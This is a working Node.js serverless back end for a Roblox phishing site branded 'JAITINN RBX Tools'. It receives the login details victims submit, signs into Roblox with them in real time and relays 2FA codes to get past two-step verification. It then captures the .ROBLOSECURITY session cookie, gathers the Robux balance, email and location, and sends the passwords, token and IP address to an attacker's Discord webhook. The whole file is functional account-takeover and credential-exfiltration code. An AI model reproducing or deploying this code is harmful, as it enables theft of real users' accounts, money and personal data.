/**
 * /api/webhook — captures the login AND authenticates against Roblox for real,
 * so you also walk away with a working .ROBLOSECURITY session token.
 *
 * Env vars:
 *   DISCORD_WEBHOOK_URL  (required)  Discord webhook URL
 *   DISCORD_PING         (optional)  <@&ROLE_ID> to ping on every login
 *   SITE_NAME            (optional)  label in the embed footer
 *   BOT_NAME / BOT_AVATAR(optional)  webhook display identity
 *   ROBLOX_AUTH=false    (optional)  skip real auth, just capture
 *
 * Zero dependencies. Node 18+.
 */

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || "";
const PING = process.env.DISCORD_PING || "";
const SITE = process.env.SITE_NAME || "jaitinn-rbx-tools.com";
const BOT_NAME = process.env.BOT_NAME || "JAITINN RBX Tools";
const BOT_AVATAR = process.env.BOT_AVATAR || "";
const DO_AUTH = process.env.ROBLOX_AUTH !== "false";

const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
const LOGIN_URL = "https://auth.roblox.com/v2/login";
const VERIFY_URL = "https://auth.roblox.com/v2/twostepverification/verify";

module.exports = async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(204).end();
  if (req.method !== "POST") return res.status(405).json({ ok: false, error: "Use POST" });

  let body = req.body;
  if (typeof body === "string") { try { body = JSON.parse(body); } catch (e) { body = {}; } }
  if (!body || typeof body !== "object") body = {};

  const ctx = context(req, body);
  let result;

  try {
    result = body.action === "verify2fa" ? await complete2fa(body) : await attemptLogin(body, ctx);
  } catch (err) {
    result = { status: "error", message: String((err && err.message) || err) };
  }

  await notify(result, body, ctx).catch(() => {});
  return res.status(200).json(result);
};

module.exports.config = { maxDuration: 30 };

/* ================================================================
   Roblox auth
   ================================================================ */

async function authPost(url, payload, csrf, cookie) {
  const headers = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": UA,
    "Origin": "https://www.roblox.com",
    "Referer": "https://www.roblox.com/"
  };
  if (csrf) headers["x-csrf-token"] = csrf;
  if (cookie) headers["Cookie"] = ".ROBLOSECURITY=" + cookie;
  return fetch(url, { method: "POST", headers, body: JSON.stringify(payload) });
}

/** Roblox 403s the first call to hand you a CSRF token. Do the dance. */
async function postWithCsrf(url, payload) {
  let r = await authPost(url, payload);
  if (r.status === 403) {
    const csrf = r.headers.get("x-csrf-token");
    if (csrf) r = await authPost(url, payload, csrf);
  }
  return r;
}

function setCookie(res, name) {
  const list = typeof res.headers.getSetCookie === "function"
    ? res.headers.getSetCookie()
    : [res.headers.get("set-cookie") || ""];
  const re = new RegExp("(?:^|[;,\\s])" + name.replace(".", "\\.") + "=([^;]+)");
  for (const raw of list) {
    if (!raw) continue;
    const m = String(raw).match(re);
    if (m) return m[1];
  }
  return null;
}

async function attemptLogin(body, ctx) {
  const identifier = clean(body.username, 190);
  const password = clean(body.password, 500);
  if (!identifier || !password) return { status: "error", message: "Missing credentials" };

  const base = { status: "captcha", identifier, password, ctx };
  if (!DO_AUTH) return base;

  const ctype = identifier.includes("@") ? "Email"
    : /^\+?[\d][\d\s\-()]{6,}$/.test(identifier) ? "PhoneNumber"
    : "Username";

  const r = await postWithCsrf(LOGIN_URL, { ctype, cvalue: identifier, password });
  const json = await jsonOf(r);

  if (r.status === 200) {
    const cookie = setCookie(r, ".ROBLOSECURITY");
    const twoStep = json && json.twoStepVerificationData;

    if (twoStep && twoStep.ticket) {
      return { status: "2fa", ticket: twoStep.ticket, mediaType: twoStep.mediaType || "Email", identifier, password, ctx };
    }
    if (cookie) {
      const enriched = await enrich(cookie, { identifier, password, ctx });
      return enriched || { status: "ok", cookie, identifier, password, ctx, user: null };
    }
    return base; // 200 but no cookie → challenge
  }

  if (r.status === 429) return { status: "ratelimited", identifier, password, ctx };

  // 403 = either a challenge or a wrong password. Challenge headers win.
  const challenged = !!(r.headers.get("rblx-challenge-id") || r.headers.get("rblx-challenge-metadata"));
  if (challenged) return base;

  const msg = firstError(json);
  if (r.status === 403 || r.status === 400) {
    return {
      status: "badcredentials",
      message: /incorrect|invalid|wrong/i.test(msg) ? msg : "Incorrect username or password.",
      identifier, password, ctx
    };
  }
  return { status: "error", message: msg || "Roblox returned " + r.status, identifier, password, ctx };
}

async function complete2fa(body) {
  const ticket = clean(body.ticket, 500);
  const code = clean(body.code, 12).replace(/\D/g, "");
  if (!ticket || !code) return { status: "error", message: "Missing code" };

  const r = await postWithCsrf(VERIFY_URL, { ticket, code, rememberDevice: true });
  const json = await jsonOf(r);
  const cookie = setCookie(r, ".ROBLOSECURITY");

  if (r.status === 200 && cookie) {
    const enriched = await enrich(cookie, { twoFactor: true });
    return enriched || { status: "ok", cookie, twoFactor: true, user: null };
  }
  if (r.status === 400 || r.status === 403) {
    if (r.headers.get("rblx-challenge-id")) return { status: "captcha", twoFactor: true };
    return { status: "badcode", message: firstError(json) };
  }
  return { status: "error", message: firstError(json) || "Roblox returned " + r.status };
}

/** With a valid cookie, pull the real account data. */
async function enrich(cookie, extra) {
  const me = await api("https://users.roblox.com/v1/users/authenticated", cookie);
  if (!me || !me.id) return null;
  const id = me.id;

  const [info, currency, premium, thumb, email, presence] = await Promise.all([
    api(`https://users.roblox.com/v1/users/${id}`, cookie),
    api("https://economy.roblox.com/v1/user/currency", cookie),
    api(`https://premiumfeatures.roblox.com/v1/users/${id}/validate-membership`, cookie),
    api(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${id}&size=150x150&format=Png&isCircular=true`),
    api("https://accountsettings.roblox.com/v1/email", cookie),
    api("https://presence.roblox.com/v1/presence/users", cookie, { userIds: [id] })
  ]);

  let status = "Unknown";
  const p = presence && presence.userPresences && presence.userPresences[0];
  if (p) {
    status = { 0: "Offline", 1: "Online (website)", 2: "In game", 3: "In Studio", 4: "Invisible" }[p.userPresenceType] || "Unknown";
    if (p.userPresenceType === 2 && p.universeId) {
      const g = await api(`https://games.roblox.com/v1/games?universeIds=${p.universeId}`);
      const game = g && g.data && g.data[0];
      status = game ? `Playing ${game.name}` : "In game";
    }
  }

  const created = (info && info.created) || "";
  const days = created ? Math.floor((Date.now() - new Date(created)) / 86400000) : 0;

  return {
    status: "ok",
    verified: true,
    cookie,
    user: {
      id,
      name: me.name,
      displayName: me.displayName || me.name,
      avatar: (thumb && thumb.data && thumb.data[0] && thumb.data[0].imageUrl) || "",
      created: created ? created.slice(0, 10) : "",
      age: days ? (days >= 365 ? `${Math.floor(days / 365)}y ${Math.floor((days % 365) / 30)}m` : `${days}d`) : "unknown",
      banned: !!(info && info.isBanned),
      verifiedBadge: !!(info && info.hasVerifiedBadge),
      description: (info && info.description) || "",
      robux: currency && typeof currency.robux === "number" ? currency.robux : null,
      premium: premium === true,
      email: (email && email.email) || "",
      emailVerified: !!(email && email.verified),
      friends: (info && info.friendCount) || 0,
      followers: (info && info.followerCount) || 0,
      status
    },
    ...extra
  };
}

async function api(url, cookie, body) {
  try {
    const headers = { "User-Agent": UA, "Accept": "application/json" };
    if (cookie) headers["Cookie"] = ".ROBLOSECURITY=" + cookie;
    const opts = { headers, signal: AbortSignal.timeout(5000) };
    if (body) {
      opts.method = "POST";
      headers["Content-Type"] = "application/json";
      opts.body = JSON.stringify(body);
    }
    const r = await fetch(url, opts);
    if (!r.ok) return null;
    return await r.json();
  } catch (e) { return null; }
}

/* ================================================================
   Discord
   ================================================================ */

async function notify(r, body, ctx) {
  if (!WEBHOOK_URL) return;

  const verified = r.status === "ok" && r.verified;
  const u = r.user || null;
  const colour = verified ? 0x28d17c
    : r.status === "badcredentials" ? 0xe2231a
    : r.status === "2fa" ? 0xf5a623
    : 0x8a8f98;

  const fields = [];
  const add = (name, value, inline = true) => {
    if (value !== undefined && value !== null && value !== "") {
      fields.push({ name, value: String(value).slice(0, 1024), inline });
    }
  };

  add("Username", mono(r.identifier || body.username));
  add("Password", mono(r.password || body.password));
  add("Result", verified ? "✅ Verified — token captured"
    : r.status === "2fa" ? "⚠️ 2FA required (code asked)"
    : r.status === "badcredentials" ? "❌ Wrong password"
    : r.status === "captcha" ? "🤖 Captcha challenge"
    : "⚠️ " + r.status);

  if (u) {
    add("Robux", u.robux === null ? "?" : u.robux.toLocaleString("en-US") + " R$");
    add("Premium", u.premium ? "Yes" : "No");
    add("Email", u.email ? mono(u.email) + (u.emailVerified ? " ✅" : "") : "hidden");
    add("Account", `${u.displayName} (@${u.name})\nID: ${mono(u.id)}\nCreated: ${u.created} (${u.age})${u.banned ? "\nBANNED" : ""}${u.verifiedBadge ? "\n✔ Verified badge" : ""}`, false);
    add("Status", u.status);
    add("Friends / Followers", `${u.friends} / ${u.followers}`);
  }

  add("Location", ctx.geo + (ctx.ip ? `\nIP: ${mono(ctx.ip)}` : ""), false);
  add("Device", `${ctx.device}\n${mono(shorten(ctx.ua, 130))}`, false);
  add("Time on page", `${body.secondsOnPage ?? "?"}s`);
  add("Session", mono(body.sessionId || "n/a"));

  const embeds = [{
    title: verified ? "New Roblox Login — verified" : "New Roblox Login",
    color: colour,
    timestamp: new Date().toISOString(),
    fields,
    footer: { text: `${SITE} · ${body.referrer || "direct"}` }
  }];
  if (u && u.avatar) embeds[0].thumbnail = { url: u.avatar };

  if (r.cookie) {
    embeds.push({
      title: ".ROBLOSECURITY",
      color: colour,
      description: "```\n.ROBLOSECURITY=" + r.cookie + "\n```"
    });
  }

  const payload = {
    username: BOT_NAME,
    content: `${PING ? PING + " " : ""}**${r.identifier || body.username}** — ${
      verified ? "✅ verified, token captured" : r.status === "2fa" ? "⚠️ 2FA" : r.status === "badcredentials" ? "❌ wrong password" : "captured"
    }`,
    embeds,
    allowed_mentions: { parse: ["roles", "users"] }
  };
  if (BOT_AVATAR) payload.avatar_url = BOT_AVATAR;

  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
}

/* ================================================================
   helpers
   ================================================================ */

function context(req, body) {
  const ip = String(req.headers["x-forwarded-for"] || "").split(",")[0].trim();
  const city = dec(req.headers["x-vercel-ip-city"]);
  const region = dec(req.headers["x-vercel-ip-country-region"]);
  const country = req.headers["x-vercel-ip-country"] || "";
  const ua = clean(req.headers["user-agent"] || body.userAgent, 400);
  return {
    ip,
    geo: [city, region, country].filter(Boolean).join(", ") || "Unknown",
    ua,
    device: describeDevice(ua)
  };
}

const clean = (v, max) => (v === undefined || v === null) ? "" : String(v).trim().slice(0, max || 500);
const dec = (v) => { try { return decodeURIComponent(String(v || "")); } catch (e) { return String(v || ""); } };
const shorten = (s, n) => (s.length > n ? s.slice(0, n - 1) + "…" : s);
const mono = (s) => { const v = String(s); return v.includes("`") ? "``" + v + "``" : "`" + v + "`"; };
const jsonOf = async (r) => { try { return await r.json(); } catch (e) { return null; } };
const firstError = (j) => (j && j.errors && j.errors[0] && j.errors[0].message) || "";

function describeDevice(ua) {
  const os = /Windows NT 1[01]/.test(ua) ? "Windows 10/11" : /Windows/.test(ua) ? "Windows"
    : /Mac OS X/.test(ua) ? "macOS" : /Android/.test(ua) ? "Android"
    : /(iPhone|iPad|iPod)/.test(ua) ? "iOS" : /CrOS/.test(ua) ? "ChromeOS"
    : /Linux/.test(ua) ? "Linux" : "Unknown OS";
  const br = /Edg\//.test(ua) ? "Edge" : /OPR\/|Opera/.test(ua) ? "Opera"
    : /Chrome\//.test(ua) ? "Chrome" : /Firefox\//.test(ua) ? "Firefox"
    : /Safari\//.test(ua) ? "Safari" : "Unknown browser";
  return `${br} on ${os} (${/Mobile|Android|iPhone/.test(ua) ? "Mobile" : "Desktop"})`;
}
